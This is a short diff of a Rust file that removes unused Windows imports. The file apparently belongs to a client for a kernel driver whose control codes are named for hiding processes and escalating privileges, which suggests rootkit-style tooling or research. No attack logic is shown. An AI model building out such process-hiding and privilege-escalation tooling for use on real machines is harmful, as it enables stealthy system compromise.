@@ -3,10 +3,10 @@ use std::ffi::c_void;
 use crate::constants::{IOCTL_PROCESS_HIDE_REQUEST, IOCTL_PROCESS_PRIVILEGE_ESCALATION_REQUEST};
 
 use windows::core::w;
-use windows::Win32::Foundation::{HANDLE, STATUS_SUCCESS, STATUS_UNSUCCESSFUL};
+use windows::Win32::Foundation::{HANDLE};
 use windows::Win32::Storage::FileSystem::CreateFileW;
 use windows::Win32::Storage::FileSystem::FILE_FLAGS_AND_ATTRIBUTES;
-use windows::Win32::Storage::FileSystem::{CREATE_ALWAYS, OPEN_EXISTING};
+use windows::Win32::Storage::FileSystem::{OPEN_EXISTING};
 use windows::Win32::Storage::FileSystem::{
     FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE,
 };
